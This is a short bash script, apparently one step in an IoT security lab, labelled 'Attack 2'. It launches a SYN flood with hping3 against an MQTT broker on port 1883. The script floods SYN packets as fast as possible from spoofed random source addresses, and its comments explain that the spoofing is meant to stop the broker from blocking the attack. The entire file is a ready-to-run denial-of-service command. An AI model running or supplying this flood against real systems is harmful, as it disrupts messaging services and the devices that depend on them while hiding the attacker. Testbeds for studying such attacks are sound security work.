#!/bin/bash

echo "[*] Starting Attack 2: SYN Flood against MQTT Broker (Port 1883)"
echo "[!] Press Ctrl+C to stop the attack."

# hping3 flags used:
# -S : Set SYN flag (start a TCP connection but never finish it)
# -p 1883 : Target the MQTT port
# --flood : Send packets as fast as possible
# --rand-source : Spoof the source IP so the broker can't easily block it
hping3 -S -p 1883 --flood --rand-source broker